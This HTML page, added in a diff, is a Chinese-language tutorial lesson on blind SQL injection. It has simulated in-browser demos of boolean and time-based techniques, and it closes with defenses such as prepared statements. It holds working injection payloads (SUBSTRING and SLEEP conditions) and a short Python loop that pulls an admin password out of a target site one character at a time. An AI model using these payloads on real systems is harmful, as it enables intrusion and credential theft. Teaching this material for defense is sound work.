@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>第五課：盲注 (Blind SQL Injection)</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🕵️ 第五課：盲注 (Blind SQL Injection)</h1>
+            <p class="subtitle">學習在沒有錯誤訊息時，如何一步步竊取資料</p>
+        </header>
+
+        <div class="nav-bar">
+            <a href="index.html" class="nav-btn">🏠 回首頁</a>
+            <a href="page4-union-select.html" class="nav-btn">⬅️ 上一課</a>
+        </div>
+
+        <div class="explanation-box">
+            <h3>💡 什麼是盲注？</h3>
+            <p><strong>盲注 (Blind SQL Injection)</strong> 是指在<strong>看不到任何錯誤訊息或查詢結果</strong>的情況下，仍然能夠竊取資料的攻擊手法。</p>
+            <p>這種情況發生在：</p>
+            <ul>
+                <li>❌ 網站不顯示 SQL 錯誤訊息</li>
+                <li>❌ 查詢結果不會顯示在頁面上</li>
+                <li>❌ 無法使用 UNION SELECT</li>
+            </ul>
+            <p>但攻擊者仍然可以透過<strong>頁面的細微變化</strong>來推測資料！</p>
+        </div>
+
+        <!-- 盲注類型 -->
+        <div class="demo-section">
+            <h2>📚 盲注的兩種類型</h2>
+
+            <div class="flow-diagram">
+                <div class="flow-box" style="flex: 1;">
+                    <strong>🔵 布林盲注</strong><br>
+                    <strong>(Boolean-based)</strong><br><br>
+                    觀察頁面內容的變化<br>
+                    <hr style="margin: 10px 0;">
+                    • 條件為真 → 顯示商品<br>
+                    • 條件為假 → 不顯示商品
+                </div>
+
+                <div class="flow-box" style="flex: 1;">
+                    <strong>⏱️ 時間盲注</strong><br>
+                    <strong>(Time-based)</strong><br><br>
+                    觀察回應時間的變化<br>
+                    <hr style="margin: 10px 0;">
+                    • 條件為真 → 延遲 5 秒<br>
+                    • 條件為假 → 立即回應
+                </div>
+            </div>
+        </div>
+
+        <!-- 布林盲注 -->
+        <div class="demo-section">
+            <h2>🔵 類型 1：布林盲注 (Boolean-based Blind SQL Injection)</h2>
+
+            <div class="explanation-box">
+                <h3>💡 原理說明</h3>
+                <p>攻擊者透過觀察頁面內容的<strong>有無</strong>來判斷條件的真假。</p>
+                <p>就像玩「猜數字遊戲」，每次只能問「是或否」的問題，逐步縮小範圍。</p>
+            </div>
+
+            <div class="warning-box">
+                <h3>🎯 攻擊情境</h3>
+                <p>假設有一個商品查詢頁面：<code>product.php?id=1</code></p>
+                <p>• 正確的 ID → 顯示商品資訊</p>
+                <p>• 錯誤的 ID → 顯示「找不到商品」</p>
+                <p>攻擊者可以利用這個「有或無」的差異來推測資料！</p>
+            </div>
+
+            <h3>🧪 實驗：布林盲注測試</h3>
+
+            <div class="input-group">
+                <label>測試 1：正常查詢</label>
+                <input type="text" id="bool1" value="1" readonly>
+                <button class="btn btn-primary" onclick="boolTest1()">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 2：加入真條件 (AND 1=1)</label>
+                <input type="text" id="bool2" value="1 AND 1=1" readonly>
+                <button class="btn btn-primary" onclick="boolTest2()">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 3：加入假條件 (AND 1=2)</label>
+                <input type="text" id="bool3" value="1 AND 1=2" readonly>
+                <button class="btn btn-danger" onclick="boolTest3()">測試</button>
+            </div>
+
+            <div class="code-display" id="bool-sql">
+                點擊測試按鈕查看 SQL 指令
+            </div>
+
+            <div class="result-display" id="bool-result">
+                測試結果會顯示在這裡
+            </div>
+
+            <div class="explanation-box" id="bool-explanation" style="display: none;">
+                <h3>✅ 發現盲注漏洞！</h3>
+                <p>觀察到：</p>
+                <ul>
+                    <li><code>1 AND 1=1</code> → 顯示商品（條件為真）</li>
+                    <li><code>1 AND 1=2</code> → 不顯示商品（條件為假）</li>
+                </ul>
+                <p>這表示我們可以透過構造條件來「問問題」，系統會用「有或無」來回答！</p>
+            </div>
+        </div>
+
+        <!-- 逐字元探測 -->
+        <div class="demo-section">
+            <h2>🔍 布林盲注：逐字元探測管理員密碼</h2>
+
+            <div class="danger-box">
+                <h3>🚨 攻擊目標</h3>
+                <p>假設我們想知道管理員（admin）的密碼是什麼。</p>
+                <p>我們可以逐字元地問系統：</p>
+                <ul>
+                    <li>「密碼的第一個字元是 a 嗎？」</li>
+                    <li>「密碼的第一個字元是 b 嗎？」</li>
+                    <li>「密碼的第一個字元是 s 嗎？」✓ （找到了！）</li>
+                </ul>
+            </div>
+
+            <div class="explanation-box">
+                <h3>💡 使用的 SQL 函數</h3>
+                <p><code>SUBSTRING(字串, 位置, 長度)</code> - 取出字串的一部分</p>
+                <p><code>ASCII(字元)</code> - 取得字元的 ASCII 碼</p>
+                <p>範例：<code>SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)</code></p>
+                <p>→ 取出 admin 密碼的第 1 個字元</p>
+            </div>
+
+            <h3>🎮 互動式探測器</h3>
+
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <p><strong>目標：</strong>探測管理員密碼（密碼是 <span style="background: black; color: black; user-select: none;">secret</span>）</p>
+                <p><strong>目前進度：</strong><span id="discovered-password" style="font-size: 1.5em; font-family: monospace; color: #28a745;"></span><span id="unknown-chars" style="font-size: 1.5em; font-family: monospace; color: #ccc;">______</span></p>
+                <p><strong>已測試：</strong><span id="test-count">0</span> 次</p>
+            </div>
+
+            <div class="input-group">
+                <label>選擇要探測的位置：</label>
+                <select id="char-position">
+                    <option value="1">第 1 個字元</option>
+                    <option value="2">第 2 個字元</option>
+                    <option value="3">第 3 個字元</option>
+                    <option value="4">第 4 個字元</option>
+                    <option value="5">第 5 個字元</option>
+                    <option value="6">第 6 個字元</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <label>猜測的字元：</label>
+                <input type="text" id="guess-char" maxlength="1" placeholder="輸入一個字元" value="s">
+            </div>
+
+            <button class="btn btn-warning" onclick="guessChar()">測試這個字元</button>
+            <button class="btn btn-success" onclick="autoGuess()">自動探測（逐字元）</button>
+            <button class="btn btn-danger" onclick="resetGuess()">重置</button>
+
+            <div class="code-display" id="guess-sql">
+                點擊「測試這個字元」查看 SQL 指令
+            </div>
+
+            <div class="result-display" id="guess-result">
+                測試結果會顯示在這裡
+            </div>
+        </div>
+
+        <!-- 時間盲注 -->
+        <div class="demo-section">
+            <h2>⏱️ 類型 2：時間盲注 (Time-based Blind SQL Injection)</h2>
+
+            <div class="explanation-box">
+                <h3>💡 原理說明</h3>
+                <p>當頁面內容完全沒有變化時，攻擊者可以改為觀察<strong>回應時間</strong>。</p>
+                <p>使用 <code>SLEEP()</code> 函數來製造延遲：</p>
+                <ul>
+                    <li>條件為真 → 延遲 5 秒後回應</li>
+                    <li>條件為假 → 立即回應</li>
+                </ul>
+            </div>
+
+            <div class="warning-box">
+                <h3>🎯 攻擊情境</h3>
+                <p>即使頁面完全沒有任何變化，攻擊者仍可透過延遲來竊取資料。</p>
+                <p>就像在黑暗中，透過「等待時間」來傳遞訊息。</p>
+            </div>
+
+            <h3>🧪 實驗：時間盲注測試</h3>
+
+            <div class="input-group">
+                <label>測試 1：假條件 + SLEEP（應該立即回應）</label>
+                <input type="text" id="time1" value="1 AND 1=2 AND SLEEP(3)" readonly>
+                <button class="btn btn-primary" onclick="timeTest(1, false)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 2：真條件 + SLEEP（應該延遲 3 秒）</label>
+                <input type="text" id="time2" value="1 AND 1=1 AND SLEEP(3)" readonly>
+                <button class="btn btn-warning" onclick="timeTest(2, true)">測試（會延遲）</button>
+            </div>
+
+            <div class="code-display" id="time-sql">
+                點擊測試按鈕查看 SQL 指令
+            </div>
+
+            <div class="result-display" id="time-result">
+                <div id="time-indicator" style="display: none; text-align: center; padding: 20px;">
+                    <div style="font-size: 3em;">⏳</div>
+                    <div>查詢執行中...</div>
+                    <div id="time-elapsed" style="font-size: 1.5em; margin-top: 10px;">0 秒</div>
+                </div>
+                測試結果會顯示在這裡
+            </div>
+
+            <div class="explanation-box">
+                <h3>💡 時間盲注的實際應用</h3>
+                <p>攻擊者可以用類似布林盲注的方式逐字元探測：</p>
+                <pre style="background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto;">
+<span style="color: #6a9955;">-- 如果密碼第一個字元是 's'，延遲 5 秒</span>
+<span style="color: #569cd6;">1 AND IF(</span>
+    <span style="color: #dcdcaa;">SUBSTRING</span>((<span style="color: #569cd6;">SELECT</span> password <span style="color: #569cd6;">FROM</span> users <span style="color: #569cd6;">WHERE</span> username=<span style="color: #ce9178;">'admin'</span>), <span style="color: #b5cea8;">1</span>, <span style="color: #b5cea8;">1</span>) = <span style="color: #ce9178;">'s'</span>,
+    <span style="color: #dcdcaa;">SLEEP</span>(<span style="color: #b5cea8;">5</span>),
+    <span style="color: #b5cea8;">0</span>
+<span style="color: #569cd6;">)</span>
+                </pre>
+            </div>
+        </div>
+
+        <!-- 比較表 -->
+        <div class="demo-section">
+            <h2>📊 盲注類型比較</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>特性</th>
+                        <th>布林盲注</th>
+                        <th>時間盲注</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>判斷依據</strong></td>
+                        <td>頁面內容有無變化</td>
+                        <td>回應時間長短</td>
+                    </tr>
+                    <tr>
+                        <td><strong>速度</strong></td>
+                        <td>較快</td>
+                        <td>較慢（需要等待延遲）</td>
+                    </tr>
+                    <tr>
+                        <td><strong>可靠性</strong></td>
+                        <td>高</td>
+                        <td>中（可能受網路影響）</td>
+                    </tr>
+                    <tr>
+                        <td><strong>適用情境</strong></td>
+                        <td>頁面內容會變化</td>
+                        <td>頁面內容完全不變</td>
+                    </tr>
+                    <tr>
+                        <td><strong>使用函數</strong></td>
+                        <td>SUBSTRING, ASCII</td>
+                        <td>SLEEP, BENCHMARK</td>
+                    </tr>
+                    <tr>
+                        <td><strong>容易被偵測</strong></td>
+                        <td>較難</td>
+                        <td>較易（異常延遲）</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- 自動化攻擊 -->
+        <div class="demo-section">
+            <h2>🤖 自動化盲注攻擊</h2>
+
+            <div class="danger-box">
+                <h3>⚠️ 實際攻擊中的自動化</h3>
+                <p>手動一個字元一個字元測試太慢了！攻擊者通常會使用自動化工具：</p>
+                <ul>
+                    <li><strong>SQLMap</strong> - 最知名的 SQL Injection 自動化工具</li>
+                    <li><strong>自製腳本</strong> - 用 Python, JavaScript 等撰寫</li>
+                </ul>
+            </div>
+
+            <div class="explanation-box">
+                <h3>💡 自動化攻擊流程</h3>
+                <ol>
+                    <li>確定字串長度（用 LENGTH() 函數）</li>
+                    <li>對每個位置進行二分搜尋（Binary Search）</li>
+                    <li>逐字元確定每個字元的 ASCII 碼</li>
+                    <li>組合成完整的密碼</li>
+                </ol>
+            </div>
+
+            <div style="background: #2d2d2d; color: #f8f8f2; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <strong style="color: #4ec9b0;">Python 自動化範例（概念）：</strong>
+                <pre style="margin-top: 10px; overflow-x: auto;">
+<span style="color: #569cd6;">import</span> requests
+
+password = <span style="color: #ce9178;">""</span>
+<span style="color: #569cd6;">for</span> position <span style="color: #569cd6;">in</span> <span style="color: #dcdcaa;">range</span>(<span style="color: #b5cea8;">1</span>, <span style="color: #b5cea8;">20</span>):
+    <span style="color: #569cd6;">for</span> char <span style="color: #569cd6;">in</span> <span style="color: #ce9178;">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:
+        payload = <span style="color: #ce9178;">f"1 AND SUBSTRING((SELECT password FROM users), {position}, 1)='{char}'"</span>
+        response = requests.<span style="color: #dcdcaa;">get</span>(<span style="color: #ce9178;">f"http://target.com/product?id={payload}"</span>)
+
+        <span style="color: #569cd6;">if</span> <span style="color: #ce9178;">"商品名稱"</span> <span style="color: #569cd6;">in</span> response.text:
+            password += char
+            <span style="color: #dcdcaa;">print</span>(<span style="color: #ce9178;">f"找到第 {position} 個字元: {char}"</span>)
+            <span style="color: #569cd6;">break</span>
+
+<span style="color: #dcdcaa;">print</span>(<span style="color: #ce9178;">f"密碼是: {password}"</span>)
+                </pre>
+            </div>
+        </div>
+
+        <!-- 防禦方法 -->
+        <div class="success-box">
+            <h3>✅ 如何防禦盲注攻擊？</h3>
+
+            <p><strong>1. 使用 Prepared Statement（最重要！）</strong></p>
+            <pre style="background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 5px; overflow-x: auto;">
+<span style="color: #6a9955;">// 參數化查詢可以防止所有類型的 SQL Injection</span>
+$stmt = $pdo-><span style="color: #dcdcaa;">prepare</span>(<span style="color: #ce9178;">"SELECT * FROM products WHERE id = ?"</span>);
+$stmt-><span style="color: #dcdcaa;">execute</span>([$_GET[<span style="color: #ce9178;">'id'</span>]]);
+            </pre>
+
+            <p><strong>2. WAF (Web Application Firewall)</strong></p>
+            <ul>
+                <li>偵測異常的查詢模式</li>
+                <li>阻擋包含 SLEEP、BENCHMARK 等危險函數的請求</li>
+                <li>限制單一 IP 的請求頻率</li>
+            </ul>
+
+            <p><strong>3. 監控與警報</strong></p>
+            <ul>
+                <li>記錄異常慢的查詢</li>
+                <li>偵測大量相似的請求</li>
+                <li>追蹤可疑的 IP 位址</li>
+            </ul>
+
+            <p><strong>4. 最小權限原則</strong></p>
+            <ul>
+                <li>資料庫帳號只給必要的權限</li>
+                <li>不同功能使用不同的資料庫帳號</li>
+            </ul>
+        </div>
+
+        <div class="success-box">
+            <h3>🎓 恭喜完成所有課程！</h3>
+            <p>你已經完整學習了 SQL Injection 的各種攻擊手法：</p>
+            <ul>
+                <li>✓ SQL 基礎 CRUD 操作</li>
+                <li>✓ 字串型 SQL Injection</li>
+                <li>✓ 數字型 SQL Injection</li>
+                <li>✓ UNION SELECT 注入</li>
+                <li>✓ 布林盲注</li>
+                <li>✓ 時間盲注</li>
+            </ul>
+            <p><strong>最重要的防禦原則：永遠使用 Prepared Statement！</strong></p>
+            <a href="index.html" class="btn btn-primary">回到首頁</a>
+        </div>
+
+        <footer>
+            <p>⚠️ 請將這些知識用於防禦，而非攻擊。資訊安全需要大家一起努力！</p>
+        </footer>
+    </div>
+
+    <script>
+        const actualPassword = 'secret';
+        let discoveredPassword = '';
+        let testCount = 0;
+
+        // 格式化 SQL
+        function formatSQL(sql, dangerous = false) {
+            let formatted = sql.replace(/\b(SELECT|FROM|WHERE|AND|OR|IF|SUBSTRING|SLEEP|ASCII)\b/g, '<span class="keyword">$1</span>');
+            formatted = formatted.replace(/'([^']*)'/g, '<span class="string">\'$1\'</span>');
+            formatted = formatted.replace(/\b(\d+)\b/g, '<span class="number">$1</span>');
+
+            if (dangerous) {
+                formatted = formatted.replace(/(SLEEP|SUBSTRING|ASCII|IF)/g, '<span class="danger">$1</span>');
+            }
+
+            return formatted;
+        }
+
+        // 布林盲注測試
+        function boolTest1() {
+            const sql = `SELECT * FROM products WHERE id = 1`;
+            document.getElementById('bool-sql').innerHTML = formatSQL(sql);
+
+            const resultDiv = document.getElementById('bool-result');
+            resultDiv.className = 'result-display success';
+            resultDiv.innerHTML = `
+                <strong>✅ 查詢成功！</strong><br>
+                顯示商品：筆記型電腦<br>
+                價格：NT$ 25,000
+            `;
+        }
+
+        function boolTest2() {
+            const sql = `SELECT * FROM products WHERE id = 1 AND 1=1`;
+            document.getElementById('bool-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('bool-result');
+            resultDiv.className = 'result-display success';
+            resultDiv.innerHTML = `
+                <strong>✅ 查詢成功！</strong><br>
+                顯示商品：筆記型電腦<br>
+                價格：NT$ 25,000<br><br>
+                <strong>分析：</strong><code>1=1</code> 為真，條件成立，顯示商品
+            `;
+        }
+
+        function boolTest3() {
+            const sql = `SELECT * FROM products WHERE id = 1 AND 1=2`;
+            document.getElementById('bool-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('bool-result');
+            resultDiv.className = 'result-display error';
+            resultDiv.innerHTML = `
+                <strong>❌ 找不到商品</strong><br><br>
+                <strong>分析：</strong><code>1=2</code> 為假，條件不成立，不顯示商品<br>
+                <strong>⚠️ 頁面內容產生變化！這就是布林盲注的關鍵！</strong>
+            `;
+            document.getElementById('bool-explanation').style.display = 'block';
+        }
+
+        // 猜測字元
+        function guessChar() {
+            const position = parseInt(document.getElementById('char-position').value);
+            const guessChar = document.getElementById('guess-char').value;
+
+            if (!guessChar) {
+                alert('請輸入要猜測的字元！');
+                return;
+            }
+
+            const sql = `SELECT * FROM products WHERE id = 1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'), ${position}, 1) = '${guessChar}'`;
+            document.getElementById('guess-sql').innerHTML = formatSQL(sql, true);
+
+            const actualChar = actualPassword[position - 1];
+            const isCorrect = guessChar === actualChar;
+
+            testCount++;
+            document.getElementById('test-count').textContent = testCount;
+
+            const resultDiv = document.getElementById('guess-result');
+
+            if (isCorrect) {
+                resultDiv.className = 'result-display success';
+                resultDiv.innerHTML = `
+                    <strong>✅ 條件為真！顯示商品</strong><br>
+                    <strong>結論：第 ${position} 個字元是 '${guessChar}'</strong><br><br>
+                    恭喜！你找到了一個字元！
+                `;
+
+                // 更新已發現的密碼
+                if (!discoveredPassword.includes(guessChar) || discoveredPassword.length < position) {
+                    let temp = discoveredPassword.split('');
+                    temp[position - 1] = guessChar;
+                    discoveredPassword = temp.join('');
+                    updatePasswordDisplay();
+                }
+            } else {
+                resultDiv.className = 'result-display error';
+                resultDiv.innerHTML = `
+                    <strong>❌ 條件為假！找不到商品</strong><br>
+                    <strong>結論：第 ${position} 個字元不是 '${guessChar}'</strong><br><br>
+                    正確答案是 '${actualChar}'，繼續嘗試！
+                `;
+            }
+        }
+
+        // 自動探測
+        async function autoGuess() {
+            const chars = 'abcdefghijklmnopqrstuvwxyz';
+            let result = '';
+
+            for (let pos = 1; pos <= actualPassword.length; pos++) {
+                for (let char of chars) {
+                    document.getElementById('char-position').value = pos;
+                    document.getElementById('guess-char').value = char;
+
+                    guessChar();
+
+                    if (actualPassword[pos - 1] === char) {
+                        result += char;
+                        updatePasswordDisplay();
+                        await sleep(500);
+                        break;
+                    }
+                    await sleep(300);
+                }
+            }
+
+            const resultDiv = document.getElementById('guess-result');
+            resultDiv.className = 'result-display success';
+            resultDiv.innerHTML = `
+                <strong>🎉 自動探測完成！</strong><br>
+                <strong>管理員密碼是：${result}</strong><br><br>
+                總共測試了 ${testCount} 次<br>
+                這就是盲注攻擊的威力！
+            `;
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function updatePasswordDisplay() {
+            document.getElementById('discovered-password').textContent = discoveredPassword;
+            const remaining = actualPassword.length - discoveredPassword.length;
+            document.getElementById('unknown-chars').textContent = '_'.repeat(Math.max(0, remaining));
+        }
+
+        function resetGuess() {
+            discoveredPassword = '';
+            testCount = 0;
+            document.getElementById('test-count').textContent = '0';
+            updatePasswordDisplay();
+            document.getElementById('guess-result').className = 'result-display';
+            document.getElementById('guess-result').innerHTML = '測試結果會顯示在這裡';
+        }
+
+        // 時間盲注測試
+        let timeTestInterval;
+
+        function timeTest(testNum, shouldDelay) {
+            const input = document.getElementById('time' + testNum).value;
+            const sql = `SELECT * FROM products WHERE id = ${input}`;
+            document.getElementById('time-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('time-result');
+            const indicator = document.getElementById('time-indicator');
+            const elapsedDiv = document.getElementById('time-elapsed');
+
+            if (shouldDelay) {
+                // 顯示計時器
+                indicator.style.display = 'block';
+                let elapsed = 0;
+
+                timeTestInterval = setInterval(() => {
+                    elapsed += 0.1;
+                    elapsedDiv.textContent = elapsed.toFixed(1) + ' 秒';
+                }, 100);
+
+                // 3 秒後顯示結果
+                setTimeout(() => {
+                    clearInterval(timeTestInterval);
+                    indicator.style.display = 'none';
+                    resultDiv.className = 'result-display error';
+                    resultDiv.innerHTML = `
+                        <strong>⏱️ 回應時間：3.0 秒</strong><br><br>
+                        因為條件 <code>1=1</code> 為真，執行了 <code>SLEEP(3)</code><br>
+                        <strong>⚠️ 延遲 3 秒！這就是時間盲注的特徵！</strong><br><br>
+                        攻擊者可以透過這種方式逐字元探測資料
+                    `;
+                }, 3000);
+            } else {
+                resultDiv.className = 'result-display success';
+                resultDiv.innerHTML = `
+                    <strong>⚡ 回應時間：0.05 秒</strong><br><br>
+                    因為條件 <code>1=2</code> 為假，不執行 <code>SLEEP(3)</code><br>
+                    立即回應！
+                `;
+            }
+        }
+
+        // 初始化
+        updatePasswordDisplay();
+    </script>
+</body>
+</html>
